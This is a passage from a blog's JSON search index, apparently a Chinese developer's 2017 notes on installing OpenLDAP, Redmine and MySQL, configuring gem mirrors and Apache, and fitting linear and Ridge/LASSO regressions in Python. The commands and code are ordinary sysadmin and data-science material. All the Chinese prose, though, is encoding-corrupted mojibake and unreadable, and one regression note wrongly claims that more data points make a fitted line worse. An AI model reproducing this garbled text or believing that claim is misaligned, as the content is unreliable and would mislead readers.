DATABASE confluence CHARACTER SET utf8 COLLATE utf8_bin; mysql é…ç½®æ–‡ä»¶: vim /etc/mysql/conf.d/mysql.cnf [mysql] default-character-set=utf8","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"confluence","slug":"confluence","permalink":"https://wangxiuwen.github.io/tags/confluence/"},{"name":"ä¹±ç ","slug":"ä¹±ç ","permalink":"https://wangxiuwen.github.io/tags/%E4%B9%B1%E7%A0%81/"}],"author":"wangxiuwen"},{"title":"æ‘‡æ»šç å†œèšé›†åœ°","slug":"history/music/5965a0f92139e0ad358b5912","date":"2017-07-12T04:09:29.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5965a0f92139e0ad358b5912/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5965a0f92139e0ad358b5912/","excerpt":"","text":"æ‘‡æ»šç å†œèšé›†åœ°!","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"},{"name":"æ‘‡æ»šç å†œèšé›†åœ°","slug":"æ‘‡æ»šç å†œèšé›†åœ°","permalink":"https://wangxiuwen.github.io/tags/%E6%91%87%E6%BB%9A%E7%A0%81%E5%86%9C%E8%81%9A%E9%9B%86%E5%9C%B0/"}],"author":"baipeng"},{"title":"openldap ç¼–è¯‘å®‰è£…","slug":"history/tech/5965ed472139e0ad358b5916","date":"2017-07-11T21:35:03.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5965ed472139e0ad358b5916/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5965ed472139e0ad358b5916/","excerpt":"","text":"é‡åˆ°çš„å‘README é‡Œé¢æœ‰ä¸€å¥:SLAPD: BDB and HDB backends require Oracle Berkeley DB 4.4 - 4.8, or 5.0 - 5.1. It is highly recommended to apply the patches from Oracle for a given release. åˆšå¼€å§‹ä¸‹è½½äº†wget http://download.oracle.com/berkeley-db/db-6.2.32.tar.gz //è¿™é‡Œåœ¨oracleé¡µé¢ä¸Šæ‰¾åˆ°ç‰ˆæœ¬å·wgetä¸‹è½½ï¼Œå¯ä»¥è·³è¿‡æ³¨å†Œè´¦å·çš„æ­¥éª¤ ç»“æœæŠ¥é”™:configure: error: BDB/HDB: BerkeleyDB not available é…ç½®åº“è·¯å¾„:CPPFLAGS=&quot;-I/usr/local/berkeley-db/include/&quot; \\ LDFLAGS=&quot;-L/usr/local/berkeley-db/lib&quot; \\ LD_LIBRARY_PATH=&quot;/usr/local/berkeley-db/lib&quot; \\ ./configure --prefix=/usr/local/openldap æŠ¥é”™:configure: error: C compiler cannot create executables æ‰€ä»¥æ­£ç¡®çš„æ­¥éª¤:ç¼–è¯‘å®‰è£… berkeley-db:wget http://download.oracle.com/berkeley-db/db-5.1.29.tar.gz tar -xzvf db-5.1.29.tar.gz cd db-5.1.29/build_unix ../dist/configure --prefix=/usr/local/berkeley-db make -j4 make install è·å– openldap:http://www.openldap.org/software/download/ ç¼–è¯‘å®‰è£…:CPPFLAGS=&quot;-I/usr/local/berkeley-db/include/&quot; \\ LDFLAGS=&quot;-L/usr/local/berkeley-db/lib&quot; \\ LD_LIBRARY_PATH=&quot;/usr/local/berkeley-db/lib&quot; \\ ./configure --prefix=/usr/local/openldap make depend make make install æ·»åŠ schema:vim /usr/local/openldap/etc/openldap/slapd.confinclude /usr/local/openldap/etc/openldap/schema/corba.schemainclude /usr/local/openldap/etc/openldap/schema/core.schemainclude /usr/local/openldap/etc/openldap/schema/cosine.schemainclude /usr/local/openldap/etc/openldap/schema/duaconf.schemainclude /usr/local/openldap/etc/openldap/schema/dyngroup.schemainclude /usr/local/openldap/etc/openldap/schema/inetorgperson.schemainclude /usr/local/openldap/etc/openldap/schema/java.schemainclude /usr/local/openldap/etc/openldap/schema/misc.schemainclude /usr/local/openldap/etc/openldap/schema/nis.schemainclude /usr/local/openldap/etc/openldap/schema/openldap.schemainclude /usr/local/openldap/etc/openldap/schema/ppolicy.schemainclude /usr/local/openldap/etc/openldap/schema/collective.schemaç¼–è¾‘æ–‡ä»¶:vim /etc/ld.so.conf /usr/local/berkeley-db/lib/ ldconfig -v å¯åŠ¨:/usr/local/openldap/libexec/slapd å‰å°å¯åŠ¨:/usr/local/openldap/libexec/slapd -d 256 å¯¼å…¥æ ‘:ldapadd -x -D &quot;cn=Manager,dc=wangxiuwen,dc=com&quot; -w password -f setup.ldif adding new entry &quot;dc=wangxiuwen,dc=cn&quot; setup.ldif:dn: dc=wangxiuwen,dc=com ou: wangxiuwen.com objectClass: dcObject objectClass: organizationalUnit dc: wangxiuwen dn: ou=people,dc=wangxiuwen,dc=com ou: people objectClass: organizationalUnit dn: ou=groups,dc=wangxiuwen,dc=com ou: groups objectClass: organizationalUnit dn: cn=devops,ou=groups,dc=wangxiuwen,dc=com description:: 6L+Q57u0 cn: devops objectClass: posixGroup objectClass: top gidNumber: 501 memberUid: sync å®¢æˆ·ç«¯ï¼šmacï¼šhttp://www.ldapbrowsermac.com/windows:http://www.ldapadmin.org/download/ldapadmin.htmlå‚è€ƒèµ„æ–™ï¼šhttp://www.openldap.org/doc/admin22/quickstart.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"openldap","slug":"openldap","permalink":"https://wangxiuwen.github.io/tags/openldap/"}],"author":"wangxiuwen"},{"title":"linux å¢åŠ åº“è·¯å¾„","slug":"history/tech/5965eb622139e0ad358b5915","date":"2017-07-11T21:26:58.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5965eb622139e0ad358b5915/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5965eb622139e0ad358b5915/","excerpt":"","text":"ç¼–è¾‘æ–‡ä»¶:vim /etc/ld.so.conf ä½¿ä¹‹ç”Ÿæ•ˆ:ldconfig -v","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"gemå›½å†…é•œåƒ","slug":"history/tech/5965b78d2139e0ad358b5914","date":"2017-07-11T17:45:49.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5965b78d2139e0ad358b5914/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5965b78d2139e0ad358b5914/","excerpt":"","text":"https://gems.ruby-china.orggem sources -l gem sources --remove https://rubygems.org/ gem sources -l gem sources -a https://gems.ruby-china.org gem sources -l","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"gem","slug":"gem","permalink":"https://wangxiuwen.github.io/tags/gem/"},{"name":"ruby","slug":"ruby","permalink":"https://wangxiuwen.github.io/tags/ruby/"}],"author":"wangxiuwen"},{"title":"redmine å®‰è£…","slug":"history/tech/5965b6da2139e0ad358b5913","date":"2017-07-11T17:42:50.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5965b6da2139e0ad358b5913/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5965b6da2139e0ad358b5913/","excerpt":"","text":"ä¸‹è½½åœ°å€: http://www.redmine.org/projects/redmine/wiki/Download å®‰è£…ç¯å¢ƒ:apt-get install ruby apt-get install ruby-dev apt-get install libmysqlclient-dev apt-get install libmagickwand-dev gem install mysql2 gem install bundler --no-rdoc --no-ri cd redmine ä¿®æ”¹æº:vim Gemfilesource â€˜https://gems.ruby-china.orgâ€™å®‰è£…ä¾èµ–åŒ…:bundle install -V --without development test postgresql sqlite é…ç½®æ•°æ®åº“:cp /usr/share/redmine/config/database.yml.example /usr/share/redmine/config/database.yml vim /usr/share/redmine/config/database.yml production: adapter: mysql2 database: redmine host: localhost username: redmine password: &quot;my_password&quot; encoding: utf8 é…ç½®é‚®ä»¶:cp /usr/share/redmine/config/configuration.yml.example /usr/share/redmine/config/configuration.yml vim /usr/share/redmine/config/configuration.yml production: email_delivery: delivery_method: :smtp smtp_settings: address: &quot;smtp.126.com&quot; port: 465 authentication: :login domain: 'smtp.126.com' user_name: 'xxx@126.com' password: 'xxx' ç”Ÿæˆ session store secret:rake generate_secret_token è¿æ¥æ•°æ®åº“åˆ›å»ºredmineæ•°æ®åº“ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¯¼å…¥æ•°æ®åº“:cd redmine RAILS_ENV=production rake db:migrate å¯¼å…¥é»˜è®¤æ•°æ®ï¼šRAILS_ENV=production rake redmine:load_default_data å¯åŠ¨æµ‹è¯•ï¼šruby bin/rails server webrick -e production -b 192.168.1.119 -p 4000 ç™»å½•ï¼šè´¦å·ï¼š admin å¯†ç ï¼š admin","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redmine","slug":"redmine","permalink":"https://wangxiuwen.github.io/tags/redmine/"}],"author":"wangxiuwen"},{"title":"mysql 1055","slug":"history/tech/5963a49d2139e0ad358b5909","date":"2017-07-11T04:00:29.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5963a49d2139e0ad358b5909/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5963a49d2139e0ad358b5909/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯:[Err] 1055 - Expression #1 of ORDER BY clause is not in GROUP BY clause and contains nonaggregated column 'information_schema.PROFILING.SEQ' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by æ‰“å¼€mysqlå‘½ä»¤è¡Œï¼Œæ‰§è¡Œ:`select @@sqlmode` ONLY_FULL_GROUP_BYï¼šå¯¹äºGROUP BYèšåˆæ“ä½œï¼Œè‹¥selectä¸­çš„åˆ—æ²¡æœ‰åœ¨group byä¸­å‡ºç°ï¼Œé‚£ä¹ˆè¿™å¥SQLæ˜¯ä¸åˆæ³•çš„ã€‚è§£å†³åŠæ³•ä¸‹my.cnfä¸­æ·»åŠ ä»¥ä¸‹å‡ è¡Œï¼š[mysqld] sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION' åœ¨sql_mode ä¸­å»æ‰only_full_group_byï¼Œç„¶åé‡å¯MySQL Serverå³å¯ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"},{"name":"1055","slug":"1055","permalink":"https://wangxiuwen.github.io/tags/1055/"}],"author":"wangxiuwen"},{"title":"å¥½ç«™æ¨è","slug":"history/share/5964482a2139e0ad358b590b","date":"2017-07-11T03:38:18.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/share/5964482a2139e0ad358b590b/","link":"","permalink":"https://wangxiuwen.github.io/history/share/5964482a2139e0ad358b590b/","excerpt":"","text":"A place to share knowledge and better understand the world","categories":[{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/categories/%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"share","slug":"share","permalink":"https://wangxiuwen.github.io/tags/share/"},{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/tags/%E5%88%86%E4%BA%AB/"}],"author":"wangxiuwen"},{"title":"ç§æœ‰npmæœåŠ¡","slug":"history/tech/596417242139e0ad358b590a","date":"2017-07-11T00:09:08.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596417242139e0ad358b590a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596417242139e0ad358b590a/","excerpt":"","text":"sinopiahttps://github.com/rlidwka/sinopiataobaohttps://github.com/cnpm/npm.taobao.org","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"apache ClientDeniedByServer","slug":"history/tech/5964a42e2139e0ad358b590e","date":"2017-07-10T22:10:54.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5964a42e2139e0ad358b590e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5964a42e2139e0ad358b590e/","excerpt":"","text":"2.2:&lt;Directory /&gt; Order deny,allow Deny from all &lt;/Directory&gt; 2.4:&lt;Directory /&gt; Require all denied &lt;/Directory&gt; https://wiki.apache.org/httpd/ClientDeniedByServerConfiguration","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"apache","slug":"apache","permalink":"https://wangxiuwen.github.io/tags/apache/"}],"author":"wangxiuwen"},{"title":"æœåŠ¡å™¨è¶…æ—¶è§£å†³","slug":"history/tech/5964a3982139e0ad358b590d","date":"2017-07-10T22:08:24.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5964a3982139e0ad358b590d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5964a3982139e0ad358b590d/","excerpt":"","text":"é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å€¼ä¸º1ï¼Œå³å¯ç”¨:# vi /etc/sysctl.confï¼Œè®¾ç½® net.ipv4.tcp_timestamps = 0 å‚è€ƒèµ„æ–™:http://www.centoscn.com/CentosBug/osbug/2013/0726/651.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E7%BB%B4/"}],"author":"wangxiuwen"},{"title":"å†³ç­–æ ‘å’Œéšæœºæ£®æ—","slug":"history/tech/596399312139e0ad358b5908","date":"2017-07-10T03:11:45.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596399312139e0ad358b5908/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596399312139e0ad358b5908/","excerpt":"","text":"cartè§£é‡Šï¼šclassification and regression tree","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"å†³ç­–æ ‘","slug":"å†³ç­–æ ‘","permalink":"https://wangxiuwen.github.io/tags/%E5%86%B3%E7%AD%96%E6%A0%91/"},{"name":"éšæœºæ£®æ—","slug":"éšæœºæ£®æ—","permalink":"https://wangxiuwen.github.io/tags/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97/"}],"author":"wangxiuwen"},{"title":"Ridge/LASSO å›å½’","slug":"history/tech/596398972139e0ad358b5907","date":"2017-07-10T03:09:11.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596398972139e0ad358b5907/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596398972139e0ad358b5907/","excerpt":"","text":"Ridge/LASSO å›å½’Ridge:å²­å›å½’ åŠ ä¸Šæ­£åˆ™åŒ–ï¼Œ ä¹Ÿå¯ä»¥åšï¼Œéœ€è¦è¾“å…¥è¶…å‚æ•°ï¼Œå¯èƒ½æ˜¯ä¸ªalphaå€¼ï¼Œéœ€è¦äººå·¥åˆ¶å®šï¼Œå¾€å¾€ä½¿ç”¨äº¤å‰éªŒè¯æŒ‡å®šGridSearchCV ä¸­çš„ CV å°±æ˜¯ cross vilidationã€‚2016å¹´9æœˆä¹‹å‰å¯èƒ½æ˜¯ 0.17 ç‰ˆæœ¬çš„ sklearn æ˜¯from sklearn.cross_validation import GridSearchCVåŠ ä¸Šä¸€å®šçš„å¹³æ–¹çš„çº¦æŸé¡¹ï¼Œ L1 Norm, L2 Normé—®é¢˜æ­£åˆ™åŒ–æ˜¯ä»€ä¹ˆï¼Ÿè¶…å‚æ•°æ˜¯ä»€ä¹ˆï¼Ÿä¸€èˆ¬çš„ç»“è®ºæ˜¯ åŠ ä¸Š L2 æ­£åˆ™åŒ–(radge)æŒ‡æ ‡ä¸Šå¾€å¾€æ˜¯æ¯”LASSOæ›´å¥½çš„ã€‚ä½†æ˜¯LASSO å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¾—åˆ°ç¨€ç–çš„æ¨¡å‹? å¾ˆå¤šå‚æ•°å¯ä»¥æ˜¯ 0, æˆ–è€…æ˜¯æ¯”è¾ƒå°çš„æ•°ï¼Œå¸®åŠ©æˆ‘ä»¬åšç‰¹å¾æå–alpha_can æ˜¯ä»€ä¹ˆï¼ŸradgeR æ–¹ å…¶å®æŒ‡çš„æ˜¯æ‹Ÿåˆæ•ˆæœï¼Œ Ræ–¹è¶Šå¤§ï¼Œæ‹Ÿåˆæ•ˆæœè¶Šå¥½ï¼Œ R æ–¹å¯ä»¥ä¸ºè´Ÿ å®Œæ•´ä»£ç import numpy as np import matplotlib.pyplot as plt import pandas as pd from sklearn.model_selection import train_test_split from sklearn.linear_model import Lasso, Ridge from sklearn.model_selection import GridSearchCV if __name__ == &quot;__main__&quot;: # pandasè¯»å…¥ data = pd.read_csv('8.Advertising.csv') # TVã€Radioã€Newspaperã€Sales x = data[['TV', 'Radio', 'Newspaper']] # x = data[['TV', 'Radio']] y = data['Sales'] print x print y x_train, x_test, y_train, y_test = train_test_split(x, y, random_state=1) # print x_train, y_train model = Lasso() # model = Ridge() alpha_can = np.logspace(-3, 2, 10) lasso_model = GridSearchCV(model, param_grid={'alpha': alpha_can}, cv=5) lasso_model.fit(x, y) print 'éªŒè¯å‚æ•°ï¼š\\n', lasso_model.best_params_ y_hat = lasso_model.predict(np.array(x_test)) mse = np.average((y_hat - np.array(y_test)) ** 2) # Mean Squared Error rmse = np.sqrt(mse) # Root Mean Squared Error print mse, rmse t = np.arange(len(x_test)) plt.plot(t, y_test, 'r-', linewidth=2, label='Test') plt.plot(t, y_hat, 'g-', linewidth=2, label='Predict') plt.legend(loc='upper right') plt.grid() plt.show()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"Ridge","slug":"Ridge","permalink":"https://wangxiuwen.github.io/tags/Ridge/"},{"name":"LASSO","slug":"LASSO","permalink":"https://wangxiuwen.github.io/tags/LASSO/"},{"name":"å›å½’","slug":"å›å½’","permalink":"https://wangxiuwen.github.io/tags/%E5%9B%9E%E5%BD%92/"}],"author":"wangxiuwen"},{"title":"çº¿æ€§å›å½’","slug":"history/tech/5963985b2139e0ad358b5906","date":"2017-07-10T03:08:11.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5963985b2139e0ad358b5906/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5963985b2139e0ad358b5906/","excerpt":"","text":"çº¿æ€§å›å½’y = ax + b advertising æ•°æ®åˆ†æ æ•°æ®é›†æ•°æ®é›† æ•°æ®çš„è¯»å–æ‰‹å†™è¯»å–æ•°æ®f = file(path) x = [] y = [] for i, d in enumerate(f): if i == 0: continue d = d.strip() if not d: continue d = map(float, d.split(',')) x.append(d[1:-1]) y.append(d[-1]) print x print y x = np.array(x) y = np.array(y) ä½¿ç”¨ Pythonè‡ªå¸¦åº“import csv f = file(path, 'rb') print f d = csv.reader(f) for line in d: print line f.close() ä½¿ç”¨numpy:p = np.loadtxt(path, delimiter=',', skiprows=1) print p å®Œæ•´è¯»å–ä»£ç import numpy as np import matplotlib.pyplot as plt import pandas as pd path = 'advertising.csv' data = pd.read_csv(path) # TVã€Radioã€Newspaperã€Sales x = data[['TV', 'Radio', 'Newspaper']] y = data['Sales'] æ•°æ®æ˜¾ç¤ºç»˜åˆ¶1 plt.plot(data['TV'], y, 'ro', label='TV') plt.plot(data['Radio'], y, 'g^', label='Radio') plt.plot(data['Newspaper'], y, 'mv', label='Newspaer') plt.legend(loc='lower right') plt.grid() plt.show() ç»˜åˆ¶2 plt.figure(figsize=(9,12)) plt.subplot(311) # åˆ†æˆ 3*1 å ç”¨ç¬¬ä¸€è¡Œ plt.plot(data['TV'], y, 'ro') plt.title('TV') plt.grid() plt.subplot(312) plt.plot(data['Radio'], y, 'g^') plt.title('Radio') plt.grid() plt.subplot(313) plt.plot(data['Newspaper'], y, 'b*') plt.title('Newspaper') plt.grid() plt.tight_layout() plt.show() æ•°æ®æ‹†åˆ†æ ·æœ¬æ•°æ®åªæœ‰ä¸€ä»½ï¼Œæ‰€ä»¥éœ€è¦ä¸€éƒ¨åˆ†ä½œä¸ºè®­ç»ƒæ•°æ®ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ä½œä¸ºæµ‹è¯•æ•°æ®ã€‚x_trainï¼Œy_train ä¸ºè®­ç»ƒæ•°æ®ã€‚ x_testï¼Œ y_test ä¸ºæµ‹è¯•æ•°æ®ã€‚è¿™é‡Œä½¿ç”¨ sklearn åº“x_train, x_test, y_train, y_test = train_test_split(x, y, random_state=1) # print x_train, y_train è¿˜å¯ä»¥æŒ‡å®šè®­ç»ƒæ•°æ®å¤§å°x_train, x_test, y_train, y_test = train_test_split(x, y, train_size=0.8, random_state=1) # print x_train, y_train ä¸ºäº†é¿å…æ¯æ¬¡ python éƒ½éšæœºé€‰æ‹©è®­ç»ƒæ•°æ®å’Œæµ‹è¯•æ•°æ®ï¼Œå¯¼è‡´æ¯æ¬¡ç»“æœéƒ½ä¸ä¸€æ ·ï¼Œè¿™é‡Œ random_state æŒ‡å®šä¸º1ï¼Œ ä»¥ä¾¿äºæµ‹è¯•ã€‚train_size è®¾ç½®è®­ç»ƒæ•°æ®å’Œæµ‹è¯•æ•°æ®çš„æ¯”ä¾‹ï¼Œå¯ä»¥ä¸è®¾ç½®ã€‚çº¿æ€§æ¨¡å‹linreg = LinearRegression() åˆ©ç”¨çº¿æ€§æ¨¡å‹åšæ‹Ÿåˆï¼Œå¾—åˆ°æ¨¡å‹:model = linreg.fit(x_train, y_train) print model å¾—åˆ°ç³»æ•°:print linreg.coef_ [ 0.04647758 0.18534601 -0.00231602] å› ä¸º y= ax1 + bx2 + cx3 + bæ‰€ä»¥æ˜¯ä¸‰ä¸ªç³»æ•°å¾—åˆ°æˆªè·:print linreg.intercept_ åˆ©ç”¨å¾—åˆ°çš„æ¨¡å‹é¢„æµ‹:y_hat = linreg.predict(np.array(x_test)) æ±‚ å‡æ–¹è¯¯å·®(Mean Squared Error, MSE):mse = np.average((y_hat - np.array(y_test)) ** 2) # Mean Squared Error rmse = np.sqrt(mse) # Root Mean Squared Error print mse, rmse 1.97304562023 1.40465142303 å°†é¢„æµ‹å€¼å’ŒçœŸå®å€¼ç”»åˆ°ä¸€å¼ å›¾ä¸Šï¼Œçœ‹ä¸€ä¸‹é¢„æµ‹æ•ˆæœ:t = np.arange(len(x_test)) plt.plot(t, y_test, 'r-', linewidth=2, label='Test') plt.plot(t, y_hat, 'g-', linewidth=2, label='Predict') plt.legend(loc='upper right') plt.grid() plt.show() çº¢è‰²çº¿ä¸ºæµ‹è¯•æ•°æ®ï¼Œ ç»¿è‰²çº¿ä¸ºæ ¹æ®æ¨¡å‹åˆ°é¢„æµ‹æ•°æ®å®Œæ•´ä»£ç import numpy as np import matplotlib.pyplot as plt import pandas as pd from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression if __name__ == &quot;__main__&quot;: path = 'advertising.csv' data = pd.read_csv(path) # TVã€Radioã€Newspaperã€Sales x = data[['TV', 'Radio', 'Newspaper']] y = data['Sales'] x_train, x_test, y_train, y_test = train_test_split(x, y, random_state=1) # print x_train, y_train linreg = LinearRegression() model = linreg.fit(x_train, y_train) y_hat = linreg.predict(np.array(x_test)) mse = np.average((y_hat - np.array(y_test)) ** 2) # Mean Squared Error rmse = np.sqrt(mse) # Root Mean Squared Error print mse, rmse t = np.arange(len(x_test)) plt.plot(t, y_test, 'r-', linewidth=2, label='Test') plt.plot(t, y_hat, 'g-', linewidth=2, label='Predict') plt.legend(loc='upper right') plt.grid() plt.show() åˆ†ææˆ‘ä»¬å‘ç° newspaper å’Œ y ä¼¼ä¹æ²¡æœ‰å…³ç³»ï¼Œ æ‰€ä»¥ç›´æ¥å»æ‰è¿™ä¸€åˆ—é‡æ–°åˆ†æï¼Œä»£ç å¦‚ä¸‹ï¼š import numpy as np import matplotlib.pyplot as plt import pandas as pd from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression if __name__ == &quot;__main__&quot;: path = 'advertising.csv' data = pd.read_csv(path) # TVã€Radioã€Newspaperã€Sales x = data[['TV', 'Radio']] y = data['Sales'] #print x #print y x_train, x_test, y_train, y_test = train_test_split(x, y, train_size=0.9, random_state=1) linreg = LinearRegression() model = linreg.fit(x_train, y_train) y_hat = linreg.predict(np.array(x_test)) mse = np.average((y_hat - np.array(y_test)) ** 2) # Mean Squared Error rmse = np.sqrt(mse) # Root Mean Squared Error print mse, rmse 1.92627604187 1.38790346994 é—®é¢˜train_size è®¾ç½® 0.9, ç»“æœåè€Œä¸å¥½äº†2.4823957548 1.5755620441 ä½ çš„è®­ç»ƒæ•°æ®è¶Šå¤šï¼Œé‚£ä¹ˆè¿™ä¸ªç›´çº¿å°±ä¼šå»å°è¯•æ‹Ÿåˆæ›´å¤šçš„ç‚¹ã€‚è¿™ä¸ªç›´çº¿å°±ä¼šæ‘†åŠ¨ã€‚æ‘†åŠ¨ï¼Œå°±å¯¼è‡´äº†wå’Œbçš„å˜åŒ–ã€‚ä¸¤ç‚¹å°±èƒ½ç¡®å®šç›´çº¿äº†ã€‚ç‚¹è¶Šå¤šï¼Œç›´çº¿æ‹Ÿåˆæ•ˆæœè¶Šå·®ã€‚mse, rmse å¦‚ä½•è§£é‡Šï¼Ÿå‡æ–¹å·®ï¼Œå‡æ–¹æ 